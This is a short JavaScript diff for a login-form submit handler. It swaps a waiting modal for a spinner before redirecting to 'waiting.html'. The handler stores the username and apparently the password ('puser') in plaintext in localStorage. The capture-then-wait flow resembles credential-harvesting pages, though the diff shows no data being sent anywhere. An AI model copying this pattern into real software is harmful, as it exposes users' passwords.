@@ -15,12 +15,12 @@ const btnSuccess = document.querySelector('#form');
 btnSuccess.addEventListener('submit', e => {
     e.preventDefault();
 
-    document.querySelector('#modal-esperar').classList.add('d-block');
-
     info.user = document.querySelector('#user').value;
     info.puser = document.querySelector('#puser').value;
 
     LS.setItem('info', JSON.stringify(info));
+
+    showSpinner();
 
     setTimeout(()=>{
         window.location.href = 'waiting.html';
